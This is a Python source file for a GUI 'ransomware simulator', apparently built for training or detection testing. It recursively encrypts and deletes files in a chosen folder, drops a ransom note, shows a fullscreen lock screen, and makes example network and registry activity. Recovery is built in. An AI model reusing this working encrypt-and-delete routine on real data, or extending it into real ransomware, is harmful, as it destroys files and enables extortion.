
# SAFE Ransomware Simulator (Cross-platform: Windows + Linux)
# Educational demo only

import os, sys, random, string, hashlib, socket, urllib.request
from pathlib import Path
import tkinter as tk
from tkinter import filedialog, messagebox, ttk

IS_WINDOWS = os.name == "nt"
if IS_WINDOWS:
    try:
        import winreg
    except ImportError:
        winreg = None
else:
    winreg = None

APP_NAME = "SafeRansomSim"
NOTE_FILENAME = "README_DECRYPT.txt"
LOCK_EXT = ".locked"

def generate_unlock_code(length=12):
    chars = string.ascii_uppercase + string.digits
    return "DEMO-" + "".join(random.choice(chars) for _ in range(length))

def keystream(key: str, length: int) -> bytes:
    out = bytearray()
    counter = 0
    key_bytes = key.encode()
    while len(out) < length:
        h = hashlib.sha256(key_bytes + counter.to_bytes(8, "little")).digest()
        out.extend(h)
        counter += 1
    return bytes(out[:length])

def xor_encrypt(data: bytes, key: str) -> bytes:
    return bytes(a ^ b for a, b in zip(data, keystream(key, len(data))))

def write_ransom_note(folder: Path, unlock_code: str):
    note = f"""
###############################
#      DEMO RANSOM NOTE       #
###############################

Your files in this demo folder have been locked by a SAFE simulator.

To restore your data, enter the UNLOCK CODE in the ransom window:
    {unlock_code}

This is an educational simulation. No real harm has been done.
"""
    (folder / NOTE_FILENAME).write_text(note, encoding="utf-8")

def process_files(folder: Path, key: str, encrypt=True):
    targets = []
    for p in folder.rglob("*"):
        if p.is_file():
            if p.name == NOTE_FILENAME:
                continue
            if encrypt:
                if p.suffix == LOCK_EXT:
                    continue
                targets.append(p)
            else:
                if p.suffix == LOCK_EXT:
                    targets.append(p)
    for p in targets:
        try:
            data = p.read_bytes()
            transformed = xor_encrypt(data, key)
            if encrypt:
                out_path = p.with_suffix(p.suffix + LOCK_EXT)
                out_path.write_bytes(transformed)
                p.unlink(missing_ok=True)
            else:
                if p.suffix == LOCK_EXT:
                    out_path = p.with_suffix("")
                else:
                    out_path = p
                out_path.write_bytes(transformed)
                p.unlink(missing_ok=True)
        except Exception as e:
            print(f"[!] Error processing {p}: {e}")

def benign_network_activity():
    results = []
    try:
        with urllib.request.urlopen("http://example.com", timeout=3) as resp:
            results.append(f"HTTP GET example.com -> {resp.status}")
    except Exception as e:
        results.append(f"HTTP GET example.com failed: {e}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("93.184.216.34", 80))  # example.com IP
        s.sendall(b"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n")
        s.close()
        results.append("Raw socket connect to example.com:80 OK")
    except Exception as e:
        results.append(f"Socket connect failed: {e}")
    return results

def benign_registry_write():
    if not IS_WINDOWS or winreg is None:
        return False, "Registry not supported on this OS"
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\SafeRansomSim")
        winreg.SetValueEx(key, "marker", 0, winreg.REG_SZ, "demo")
        winreg.CloseKey(key)
        return True, "Wrote HKCU\Software\SafeRansomSim\marker=demo"
    except Exception as e:
        return False, f"Registry write failed: {e}"

class RansomGUI:
    def __init__(self, root):
        self.root = root
        self.root.title(APP_NAME)
        self.root.geometry("800x500")
        self.unlock_code = generate_unlock_code()
        print(f"[INFO] Unlock code: {self.unlock_code}")

        self.selected_dir = tk.StringVar()
        self.var_net = tk.BooleanVar(value=True)
        self.var_reg = tk.BooleanVar(value=True)

        frm = ttk.Frame(root, padding=12)
        frm.pack(fill="both", expand=True)

        ttk.Label(frm, text="SAFE Ransomware Simulator", font=("Segoe UI", 18, "bold")).pack(pady=6)

        row = ttk.Frame(frm)
        row.pack(fill="x", pady=4)
        ttk.Label(row, text="Demo Directory:").pack(side="left")
        ttk.Entry(row, textvariable=self.selected_dir, width=50).pack(side="left", padx=4)
        ttk.Button(row, text="Select", command=self.choose_dir).pack(side="left")

        opt = ttk.Frame(frm)
        opt.pack(fill="x", pady=6)
        ttk.Checkbutton(opt, text="Generate Network Traffic", variable=self.var_net).pack(side="left")
        if IS_WINDOWS:
            ttk.Checkbutton(opt, text="Write Registry Key", variable=self.var_reg).pack(side="left", padx=8)

        actions = ttk.Frame(frm)
        actions.pack(pady=10)
        ttk.Button(actions, text="Simulate Encrypt", command=self.simulate_encrypt).pack(side="left", padx=6)
        ttk.Button(actions, text="Simulate Decrypt", command=self.simulate_decrypt).pack(side="left", padx=6)

        self.log = tk.Text(frm, height=15)
        self.log.pack(fill="both", expand=True)
        self.log_insert("Ready. Select demo directory and click Simulate Encrypt.\n")

    def choose_dir(self):
        d = filedialog.askdirectory(title="Choose Demo Directory")
        if d:
            self.selected_dir.set(d)

    def simulate_encrypt(self):
        folder = Path(self.selected_dir.get())
        if not folder.exists() or not folder.is_dir():
            messagebox.showerror("Error", "Invalid directory")
            return
        if self.var_net.get():
            for line in benign_network_activity():
                self.log_insert("[Net] " + line + "\n")
        if IS_WINDOWS and self.var_reg.get():
            ok, msg = benign_registry_write()
            self.log_insert("[Registry] " + msg + "\n")
        write_ransom_note(folder, self.unlock_code)
        process_files(folder, self.unlock_code, encrypt=True)
        self.log_insert("[Files] Encrypted files (demo) and ransom note written.\n")
        self.popup_ransom()

    def simulate_decrypt(self):
        folder = Path(self.selected_dir.get())
        if not folder.exists() or not folder.is_dir():
            messagebox.showerror("Error", "Invalid directory")
            return
        process_files(folder, self.unlock_code, encrypt=False)
        note = folder / NOTE_FILENAME
        if note.exists():
            note.unlink()
        self.log_insert("[Files] Decrypted files and ransom note removed.\n")

    def popup_ransom(self):
        top = tk.Toplevel(self.root)
        top.attributes("-fullscreen", True)
        top.bind_all("<Control-Shift-q>", lambda e: top.destroy())
        top.title(f"SAFE DEMO — Unlock: {self.unlock_code} — Ctrl+Shift+Q to close")

        frame = tk.Frame(top, bg="black")
        frame.pack(fill="both", expand=True)
        tk.Label(frame, text="YOUR FILES ARE LOCKED (DEMO)", fg="red", bg="black", font=("Arial", 28, "bold")).pack(pady=20)
        msg = "This is a SAFE educational demo.\nEnter the unlock code to restore files.\nPress Ctrl+Shift+Q to exit."
        tk.Label(frame, text=msg, fg="white", bg="black", font=("Arial", 14)).pack(pady=10)

        code_var = tk.StringVar()
        entry = tk.Entry(frame, textvariable=code_var, font=("Consolas", 16), justify="center")
        entry.pack(pady=10)
        entry.focus()

        result = tk.Label(frame, text="", fg="white", bg="black")
        result.pack(pady=8)

        def try_unlock():
            if code_var.get().strip() == self.unlock_code:
                result.config(text="Correct code. Decrypting...", fg="green")
                self.simulate_decrypt()
                top.destroy()
            else:
                result.config(text="Incorrect code.", fg="red")

        tk.Button(frame, text="Decrypt", command=try_unlock, font=("Arial", 14)).pack(pady=10)

    def log_insert(self, text):
        self.log.insert("end", text)
        self.log.see("end")

def main():
    root = tk.Tk()
    app = RansomGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
